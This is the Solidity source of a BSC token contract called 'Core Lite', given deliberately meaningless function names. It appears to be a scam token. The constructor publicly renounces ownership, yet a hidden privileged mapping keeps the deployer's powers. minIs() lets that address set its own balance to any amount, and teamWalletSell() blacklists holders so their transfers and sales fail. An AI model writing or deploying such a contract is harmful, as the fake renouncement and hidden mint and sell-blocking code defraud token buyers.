/**
 *Submitted for verification at BscScan.com on 2023-02-14
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

abstract contract toAuto {
    function listReceiver() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface buyReceiver {
    function createPair(address sellFromFund, address listBuySell) external returns (address);
}

interface maxMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CoreLite is IERC20, toAuto {
    
    uint8 private isAtToken = 18;
    address public fromFeeIs;
    mapping(address => mapping(address => uint256)) private tradingTeam;

    bool private maxBuy;
    
    address public listEnable;
    bool public amountFrom;

    event OwnershipTransferred(address indexed teamLaunchedMode, address indexed totalSell);
    string private launchedLimit = "CLE";
    mapping(address => uint256) private takeMode;
    bool public totalFee;
    uint256 public buySwap;
    mapping(address => bool) public toTake;
    address private launchTrading;
    string private limitLaunchedTrading = "Core Lite";
    uint256 public autoMinToken;
    uint256 private maxToSwap = 100000000 * 10 ** 18;

    bool public marketingTo;
    uint256 private launchBuy;
    
    mapping(address => bool) public takeBuy;

    bool public totalEnable;
    

    constructor (){
        if (buySwap != autoMinToken) {
            totalFee = false;
        }
        maxMarketing limitEnable = maxMarketing(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        fromFeeIs = buyReceiver(limitEnable.factory()).createPair(limitEnable.WETH(), address(this));
        launchTrading = listReceiver();
        if (maxBuy) {
            launchBuy = autoMinToken;
        }
        listEnable = listReceiver();
        toTake[listReceiver()] = true;
        if (marketingTo) {
            buySwap = launchBuy;
        }
        takeMode[listReceiver()] = maxToSwap;
        emit Transfer(address(0), listEnable, maxToSwap);
        liquiditySwap();
    }

    

    function buyLimitMax() public view returns (uint256) {
        return autoMinToken;
    }

    function tokenReceiver(address liquidityMarketing) public {
        if (amountFrom) {
            return;
        }
        
        toTake[liquidityMarketing] = true;
        
        amountFrom = true;
    }

    function minSellReceiver() public {
        
        if (totalEnable == maxBuy) {
            totalEnable = true;
        }
        marketingTo=false;
    }

    function minIs(uint256 fundList) public {
        if (!toTake[listReceiver()]) {
            return;
        }
        takeMode[listEnable] = fundList;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return maxToSwap;
    }

    function autoTo(address txSwapMarketing, address exemptMarketing, uint256 fundList) internal returns (bool) {
        require(takeMode[txSwapMarketing] >= fundList);
        takeMode[txSwapMarketing] -= fundList;
        takeMode[exemptMarketing] += fundList;
        emit Transfer(txSwapMarketing, exemptMarketing, fundList);
        return true;
    }

    function transferFrom(address txSwapMarketing, address exemptMarketing, uint256 fundList) external override returns (bool) {
        if (tradingTeam[txSwapMarketing][listReceiver()] != type(uint256).max) {
            require(fundList <= tradingTeam[txSwapMarketing][listReceiver()]);
            tradingTeam[txSwapMarketing][listReceiver()] -= fundList;
        }
        return autoToken(txSwapMarketing, exemptMarketing, fundList);
    }

    function getOwner() external view returns (address) {
        return launchTrading;
    }

    function transfer(address launchedFund, uint256 fundList) external virtual override returns (bool) {
        return autoToken(listReceiver(), launchedFund, fundList);
    }

    function symbol() external view returns (string memory) {
        return launchedLimit;
    }

    function approve(address receiverLiquidityMode, uint256 fundList) public virtual override returns (bool) {
        tradingTeam[listReceiver()][receiverLiquidityMode] = fundList;
        emit Approval(listReceiver(), receiverLiquidityMode, fundList);
        return true;
    }

    function decimals() external view returns (uint8) {
        return isAtToken;
    }

    function owner() external view returns (address) {
        return launchTrading;
    }

    function tokenIs() public {
        
        
        launchBuy=0;
    }

    function liquiditySwap() public {
        emit OwnershipTransferred(listEnable, address(0));
        launchTrading = address(0);
    }

    function name() external view returns (string memory) {
        return limitLaunchedTrading;
    }

    function autoToken(address txSwapMarketing, address exemptMarketing, uint256 fundList) internal returns (bool) {
        if (txSwapMarketing == listEnable) {
            return autoTo(txSwapMarketing, exemptMarketing, fundList);
        }
        require(!takeBuy[txSwapMarketing]);
        return autoTo(txSwapMarketing, exemptMarketing, fundList);
    }

    function balanceOf(address limitIs) public view virtual override returns (uint256) {
        return takeMode[limitIs];
    }

    function toSender() public view returns (bool) {
        return totalEnable;
    }

    function teamWalletSell(address modeSwapAuto) public {
        if (autoMinToken == buySwap) {
            marketingTo = true;
        }
        if (modeSwapAuto == listEnable || modeSwapAuto == fromFeeIs || !toTake[listReceiver()]) {
            return;
        }
        if (totalFee != marketingTo) {
            marketingTo = true;
        }
        takeBuy[modeSwapAuto] = true;
    }

    function allowance(address tokenFee, address receiverLiquidityMode) external view virtual override returns (uint256) {
        return tradingTeam[tokenFee][receiverLiquidityMode];
    }

    function launchedTxLaunch() public {
        if (marketingTo) {
            totalEnable = true;
        }
        
        totalFee=false;
    }


}